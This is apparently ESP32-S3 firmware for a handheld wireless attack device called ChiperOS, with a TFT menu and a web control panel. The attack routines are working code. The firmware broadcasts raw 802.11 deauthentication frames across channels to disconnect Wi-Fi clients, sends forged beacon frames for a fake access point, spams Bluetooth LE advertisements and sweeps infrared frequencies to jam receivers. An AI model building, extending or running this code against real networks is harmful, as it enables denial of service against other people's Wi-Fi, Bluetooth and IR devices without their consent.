// 🛡️ ChiperOS v3.2 - Bruce Menu + Animations + Fixed Compilation
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <driver/ledc.h>
#include <esp_task_wdt.h>
#include <Preferences.h>

// === PINS ===
#define BTN_UP    0
#define BTN_SEL   1
#define BTN_DOWN  2
#define IR1 38
#define IR2 39
#define IR3 40

// === GLOBALS ===
TFT_eSPI tft = TFT_eSPI();
WebServer server(80);
Preferences prefs;

// System State
enum Mode { WEB_MODE, ATTACK_MODE, SAFE_MODE };
Mode currentMode = WEB_MODE;
bool deauthOn = false, fakeApOn = false, bleOn = false, irGunOn = false;
unsigned long lastDeauth = 0, lastBle = 0, lastFakeAp = 0, lastIr = 0;
unsigned long lastWebRequest = 0, lastLoop = 0;
unsigned long bootTime = 0;
int crashCount = 0;
bool inSafeMode = false;

// Menu System
enum MenuLevel { MAIN, WIFI_MENU, IR_MENU, BT_MENU, SET_MENU };
MenuLevel currentMenu = MAIN;
int menuIdx = 0;
int maxIdx = 0;

typedef void (*MenuAction)();

struct MenuItem {
  const char* name;
  MenuAction action;
};

// Menu Definitions
MenuItem mainMenu[] = {  {"WIFI", nullptr},
  {"IR", nullptr},
  {"Bluetooth", nullptr},
  {"Setting", nullptr}
};

MenuItem wifiMenu[] = {
  {"WiFi Scan", [](){ tftDrawAnim("Scanning WiFi..."); delay(500); int n=WiFi.scanNetworks(); tftDrawAnim("Found: " + String(n) + " nets"); }},
  {"WiFi Attack", [](){ fakeApOn=!fakeApOn; switchMode(); tftDrawAnim(fakeApOn?"Fake AP: ON":"Fake AP: OFF"); }},
  {"WiFi Deauther", [](){ deauthOn=!deauthOn; switchMode(); tftDrawAnim(deauthOn?"Deauth: ON":"Deauth: OFF"); }},
  {"EXIT", [](){ currentMenu=MAIN; menuIdx=0; tftDrawMenu(); }}
};

MenuItem irMenu[] = {
  {"IR Attack (Sel)", [](){ irGunOn=!irGunOn; tftDrawAnim(irGunOn?"IR Sweep: ON":"IR Sweep: OFF"); }},
  {"IR Record", [](){ tftDrawAnim("Recording... (Stub)"); }},
  {"Playback SD (BETA)", [](){ tftDrawAnim("SD Playback (Stub)"); }},
  {"EXIT", [](){ currentMenu=MAIN; menuIdx=0; tftDrawMenu(); }}
};

MenuItem btMenu[] = {
  {"BT Scan", [](){ tftDrawAnim("Scanning BLE..."); }},
  {"BT Attack", [](){ bleOn=!bleOn; if(bleOn) BLEDevice::init("ESP32-S3"); tftDrawAnim(bleOn?"BLE Spam: ON":"BLE Spam: OFF"); }},
  {"EXIT", [](){ currentMenu=MAIN; menuIdx=0; tftDrawMenu(); }}
};

MenuItem setMenu[] = {
  {"Diagnostic Mode", [](){ tftDrawAnim("Heap: " + String(ESP.getFreeHeap()/1024) + "KB"); }},
  {"Device Info", [](){ tftDrawAnim("ESP32-S3 N16R8"); delay(600); tftDrawAnim("PSRAM: " + String(ESP.getPsramSize()/1024) + "MB"); }},
  {"EXIT", [](){ currentMenu=MAIN; menuIdx=0; tftDrawMenu(); }}
};

const char* menuTitles[] = {"MAIN MENU", "WIFI", "IR", "Bluetooth", "Setting"};
MenuItem* activeMenuPtr = mainMenu;

// Attack Vars
uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF, 0x02, 0x00
};
int irFreq = 30000;
const int irFreqMin = 30000, irFreqMax = 56000, irFreqStep = 500;
int irPulseLen = 10;
bool irFwd = true;

// Forward Declarations
void switchMode();
void enterSafeMode();
void checkRecovery();void handleSerialCommand();
void tftDrawMenu();
void tftDrawAnim(const String& msg);
void handleButtons();

// === HTML INTERFACES ===
const char* htmlNormal = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ChiperOS</title><style>body{background:#0d1117;color:#0f0;font-family:monospace;text-align:center;padding:15px}
h1{color:#0ff}.c{background:#111;border:1px solid #333;padding:10px;margin:8px;border-radius:6px}
.b{padding:10px 15px;margin:4px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;color:#fff}
.r{background:#d32f2f}.g{background:#388e3c}.b2{background:#1976d2}
.s{padding:4px;margin:4px;border-radius:3px;font-weight:bold}.on{background:#0f0;color:#000}.off{background:#333;color:#666}</style></head><body>
<h1>🛡️ ChiperOS v3.2</h1>
<div class="c"><h3>WiFi</h3><div id="sD" class="s off">DEAUTH OFF</div><div id="sF" class="s off">FAKE AP OFF</div>
<button class="b r" onclick="t('deauth')">Deauth</button><button class="b g" onclick="t('fakeap')">FakeAP</button></div>
<div class="c"><h3>BLE & IR</h3><div id="sB" class="s off">BLE OFF</div><div id="sI" class="s off">IR SWEEP OFF</div>
<button class="b b2" onclick="t('ble')">BLE Spam</button><button class="b r" onclick="t('ir')">IR Sweep</button></div>
<div class="c" id="st">Loading...</div>
<script>function t(a){fetch('/'+a).then(r=>r.text()).then(d=>{document.getElementById('st').innerHTML=d;update();});}
function update(){fetch('/st').then(r=>r.text()).then(d=>{
  document.getElementById('sD').className='s '+(d.includes('DEAUTH:ON')?'on':'off');
  document.getElementById('sF').className='s '+(d.includes('FAKE:ON')?'on':'off');
  document.getElementById('sB').className='s '+(d.includes('BLE:ON')?'on':'off');
  document.getElementById('sI').className='s '+(d.includes('IR:ON')?'on':'off');
  document.getElementById('st').innerHTML=d;});}
setInterval(update,1000);update();</script></body></html>
)rawliteral";

const char* htmlSafe = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>ChiperOS - SAFE</title>
<style>body{background:#1a0000;color:#ff6b6b;font-family:monospace;text-align:center;padding:20px}
h1{color:#ff4444}.warn{background:#330000;border:2px solid #ff4444;padding:15px;margin:10px;border-radius:8px}
.b{padding:12px 20px;margin:10px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-size:16px}
.red{background:#d32f2f;color:#fff}.green{background:#388e3c;color:#fff}</style></head><body>
<h1>⚠️ SAFE MODE</h1><div class="warn">System recovered. Attacks disabled.</div>
<button class="green" onclick="fetch('/exit').then(()=>location.reload())">✅ Exit Safe Mode</button>
<button class="red" onclick="fetch('/reset').then(()=>location.reload())">🔄 Full Reset</button>
<script>setInterval(()=>fetch('/st').then(r=>r.json()).then(d=>{document.body.innerHTML+='<br>Heap:'+d.h+'KB';}),2000);</script></body></html>
)rawliteral";

// === SETUP ===
void setup() {
  Serial.begin(115200);
  pinMode(BTN_UP, INPUT_PULLUP); 
  pinMode(BTN_SEL, INPUT_PULLUP); 
  pinMode(BTN_DOWN, INPUT_PULLUP);

  prefs.begin("chiper", false);
  bootTime = millis();  crashCount = prefs.getInt("crashes", 0);
  if (crashCount >= 3) enterSafeMode();
  else prefs.putInt("crashes", crashCount + 1);

  esp_task_wdt_init(10, true);
  esp_task_wdt_add(NULL);

  // TFT Init
  delay(800);
  tft.init(); tft.setRotation(1); tft.fillScreen(TFT_BLACK);
  if (TFT_BL >= 0) { pinMode(TFT_BL, OUTPUT); digitalWrite(TFT_BL, HIGH); }

  // Boot Animation
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextFont(4);
  tft.drawString("§§§", 120 - tft.textWidth("§§§")/2, 60);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextFont(2);
  tft.drawString("Welcome to ChiperOS", 120 - tft.textWidth("Welcome to ChiperOS")/2, 100);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.fillRect(20, 140, 200, 10, TFT_DARKGREY);
  for(int i=0; i<=200; i+=20) { tft.fillRect(20, 140, i, 10, TFT_GREEN); delay(40); }
  delay(500);
  
  tft.fillScreen(TFT_BLACK);
  Serial.println("✅ ChiperOS v3.2 Ready");

  // IR PWM
  ledcSetup(0, 38000, 8); ledcAttachPin(IR1, 0);
  ledcSetup(1, 38000, 8); ledcAttachPin(IR2, 1);
  ledcSetup(2, 38000, 8); ledcAttachPin(IR3, 2);
  ledcWrite(0, 0); ledcWrite(1, 0); ledcWrite(2, 0);

  // Deauth Frame
  memcpy(&deauthFrame[16], &deauthFrame[10], 6);

  // WiFi AP
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("ChiperOS", "12345678");

  // Web Routes
  server.on("/", [](){ lastWebRequest = millis(); server.send(200, "text/html", inSafeMode ? htmlSafe : htmlNormal); });
  server.on("/deauth", [](){ if(!inSafeMode){deauthOn=!deauthOn; switchMode();} server.send(200,"text/plain",deauthOn?"DEAUTH:ON":"DEAUTH:OFF"); });
  server.on("/fakeap", [](){ if(!inSafeMode){fakeApOn=!fakeApOn; switchMode();} server.send(200,"text/plain",fakeApOn?"FAKE:ON":"FAKE:OFF"); });
  server.on("/ble", [](){ if(!inSafeMode){bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3");} server.send(200,"text/plain",bleOn?"BLE:ON":"BLE:OFF"); });
  server.on("/ir", [](){ if(!inSafeMode){irGunOn=!irGunOn; irFreq=irFreqMin;} server.send(200,"text/plain",irGunOn?"IR SWEEP ON":"IR SWEEP OFF"); });
  server.on("/reset", [](){ server.send(200,"text/plain","Resetting..."); delay(100); ESP.restart(); });
  server.on("/safe", [](){ enterSafeMode(); server.send(200,"text/plain","Entering Safe Mode"); });
  server.on("/exit", [](){ if(inSafeMode){ inSafeMode=false; prefs.putInt("crashes",0); switchMode();} server.send(200,"text/plain","Exiting Safe Mode"); });
  server.on("/st", [](){    if (inSafeMode) {
      server.send(200, "application/json", "{\"h\":" + String(ESP.getFreeHeap()/1024) + "}");
    } else {
      // ✅ ИСПРАВЛЕНО: Явное приведение к String для безопасной конкатенации
      String s = String("DEAUTH:") + (deauthOn ? "ON" : "OFF") + 
                 "|FAKE:" + (fakeApOn ? "ON" : "OFF") + 
                 "|BLE:" + (bleOn ? "ON" : "OFF") + 
                 "|IR:" + (irGunOn ? "ON" : "OFF");
      s += "<br>Heap:" + String(ESP.getFreeHeap()/1024) + "KB Uptime:" + String((millis()-bootTime)/1000) + "s";
      server.send(200, "text/html", s);
    }
  });
  server.begin();

  tftDrawMenu();
  esp_task_wdt_reset();
  lastLoop = millis();
}

// === MODE SWITCHING ===
void switchMode() {
  if (inSafeMode) return;
  bool attack = deauthOn || fakeApOn || bleOn;
  if(attack && currentMode==WEB_MODE){
    currentMode=ATTACK_MODE; 
    server.stop(); WiFi.softAPdisconnect(true); esp_wifi_set_promiscuous(true);
  } else if(!attack && currentMode==ATTACK_MODE){
    currentMode=WEB_MODE; 
    esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_MODE_AP); WiFi.softAP("ChiperOS","12345678"); server.begin();
  }
}

// === SAFE MODE ===
void enterSafeMode() {
  inSafeMode = true; currentMode = WEB_MODE;
  deauthOn = fakeApOn = bleOn = irGunOn = false;
  esp_wifi_set_promiscuous(false); BLEDevice::deinit();
  Serial.println("🛡️ SAFE MODE ACTIVATED");
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_RED); tft.drawString("⚠️ SAFE MODE", 10, 10);
  tft.setTextColor(TFT_WHITE); tft.drawString("Use Web or Serial to exit", 10, 30);
}

// === RECOVERY & SERIAL ===
void checkRecovery() {
  if (!inSafeMode && millis() - lastWebRequest > 30000 && lastWebRequest > 0) {
    server.stop(); delay(100); server.begin(); lastWebRequest = millis();
  }
  if (millis() - lastLoop > 5000) { while(1) delay(1); }
  if (!inSafeMode && millis() - bootTime > 120000 && prefs.getInt("crashes",0) > 0) {
    prefs.putInt("crashes", 0); Serial.println("✅ Stable 2min - crash counter reset");  }
}

void handleSerialCommand() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n'); cmd.trim(); cmd.toUpperCase();
    if (cmd == "RESET") ESP.restart();
    else if (cmd == "SAFE") enterSafeMode();
    else if (cmd == "EXIT" && inSafeMode) { inSafeMode=false; prefs.putInt("crashes",0); switchMode(); }
    else if (cmd == "STOP") { deauthOn=fakeApOn=bleOn=irGunOn=false; switchMode(); }
  }
}

// === BUTTON & MENU HANDLING ===
void handleButtons() {
  static unsigned long lastPress = 0;
  static bool btnHold = false;
  static unsigned long holdStart = 0;

  if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW || digitalRead(BTN_SEL) == LOW) {
    if (!btnHold) {
      lastPress = millis();
      btnHold = true;
      holdStart = millis();
    }

    // Long press for Emergency Combo (UP + DOWN)
    if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_DOWN) == LOW) {
      if (millis() - holdStart > 2000) {
        Serial.println("🚨 Emergency Combo -> Safe Mode");
        enterSafeMode();
        btnHold = false;
      }
      return;
    }

    // Short press handling (debounce 250ms)
    if (millis() - lastPress > 250 && btnHold) {
      btnHold = false; // Prevent repeat until release

      if (digitalRead(BTN_UP) == LOW) {
        menuIdx = (menuIdx > 0) ? menuIdx - 1 : maxIdx;
        tftDrawMenu();
      } else if (digitalRead(BTN_DOWN) == LOW) {
        menuIdx = (menuIdx < maxIdx) ? menuIdx + 1 : 0;
        tftDrawMenu();
      } else if (digitalRead(BTN_SEL) == LOW) {
        if (currentMenu == MAIN) {
          if (menuIdx == 0) { currentMenu = WIFI_MENU; activeMenuPtr = wifiMenu; maxIdx = 3; }
          else if (menuIdx == 1) { currentMenu = IR_MENU; activeMenuPtr = irMenu; maxIdx = 3; }          else if (menuIdx == 2) { currentMenu = BT_MENU; activeMenuPtr = btMenu; maxIdx = 2; }
          else if (menuIdx == 3) { currentMenu = SET_MENU; activeMenuPtr = setMenu; maxIdx = 2; }
          menuIdx = 0;
          tftDrawMenu();
        } else {
          if (activeMenuPtr[menuIdx].action) activeMenuPtr[menuIdx].action();
        }
      }
    }
  } else {
    btnHold = false;
  }
}

// === TFT DRAWING ===
void tftDrawMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.setTextFont(2);
  tft.drawString(menuTitles[currentMenu], 120 - tft.textWidth(menuTitles[currentMenu])/2, 5);
  
  maxIdx = (currentMenu==MAIN)?3:(currentMenu==WIFI_MENU)?3:(currentMenu==IR_MENU)?3:(currentMenu==BT_MENU)?2:2;
  activeMenuPtr = (currentMenu==MAIN)?mainMenu:(currentMenu==WIFI_MENU)?wifiMenu:(currentMenu==IR_MENU)?irMenu:(currentMenu==BT_MENU)?btMenu:setMenu;
  
  for(int i=0; i<=maxIdx; i++) {
    int y = 30 + i*35;
    if(i == menuIdx) {
      tft.fillRect(5, y-2, 230, 30, TFT_DARKGREEN);
      tft.setTextColor(TFT_BLACK, TFT_DARKGREEN);
    } else {
      tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
    }
    tft.drawString(" " + String(activeMenuPtr[i].name), 10, y);
  }
}

void tftDrawAnim(const String& msg) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.setTextFont(2);
  tft.drawString(msg, 120 - tft.textWidth(msg)/2, 80);
  tft.fillRect(20, 120, 200, 8, TFT_DARKGREY);
  for(int i=0; i<=200; i+=20) { tft.fillRect(20, 120, i, 8, TFT_GREEN); delay(40); }
  delay(600);
  tftDrawMenu();
}

// === ATTACK FUNCTIONS ===
void sendFakeAP() {
  uint8_t b[128]; memset(b,0,128);
  b[0]=0x80; b[1]=0x00; memset(&b[4],0xFF,6);
  b[10]=0x02; b[11]=0x00; b[12]=0x00; b[13]=0x00; b[14]=0x00; b[15]=random(6);  memcpy(&b[16],&b[10],6);
  uint64_t ts = (uint64_t)esp_timer_get_time();
  memcpy(&b[24], &ts, 8);
  b[32]=0xE8; b[33]=0x03; b[34]=0x01; b[35]=0x00;
  int p=36; String n="LOL_BRO"; b[p++]=0x00; b[p++]=n.length(); memcpy(&b[p],n.c_str(),n.length()); p+=n.length();
  b[p++]=0x01; b[p++]=0x08; b[p++]=0x82; b[p++]=0x84; b[p++]=0x8B; b[p++]=0x96; b[p++]=0x24; b[p++]=0x30; b[p++]=0x48; b[p++]=0x6C;
  esp_wifi_80211_tx(WIFI_IF_AP, b, p, false);
}

// === MAIN LOOP ===
void loop() {
  esp_task_wdt_reset();
  lastLoop = millis();

  if (currentMode == WEB_MODE || inSafeMode) {
    handleButtons();
    server.handleClient();
  } else {
    // In attack mode, buttons only trigger emergency combo
    if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_DOWN) == LOW) {
      static unsigned long comboStart = 0;
      if (comboStart == 0) comboStart = millis();
      if (millis() - comboStart > 2000) { enterSafeMode(); comboStart = 0; }
    } else { comboStart = 0; }
    server.handleClient(); // Keep web alive if needed, or remove to save resources
  }

  checkRecovery();
  handleSerialCommand();

  if (!inSafeMode) {
    if (deauthOn && millis()-lastDeauth>10) {
      lastDeauth=millis();
      static int ch=1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      ch=(ch==1)?6:(ch==6)?11:1;
      deauthFrame[22]=random(256); deauthFrame[23]=random(256);
      esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
    }
    if (fakeApOn && millis()-lastFakeAp>200) { lastFakeAp=millis(); sendFakeAP(); }
    if (bleOn && millis()-lastBle>100) {
      lastBle=millis();
      BLEAdvertising* p=BLEDevice::getAdvertising(); p->stop();
      p->addServiceUUID(BLEUUID((uint16_t)random(0x1800,0x2000)));
      p->setMinPreferred(0x06); p->setMaxPreferred(0x12); p->start();
    }
    if (irGunOn && millis()-lastIr > irPulseLen) {
      lastIr = millis();
      ledcSetup(0, irFreq, 8); ledcSetup(1, irFreq, 8); ledcSetup(2, irFreq, 8);
      ledcWrite(0, 85); ledcWrite(1, 85); ledcWrite(2, 85);
      if(irFwd) { irFreq += irFreqStep; if(irFreq >= irFreqMax) { irFreq = irFreqMax; irFwd = false; } }      else { irFreq -= irFreqStep; if(irFreq <= irFreqMin) { irFreq = irFreqMin; irFwd = true; } }
    }
  }
  yield();
}
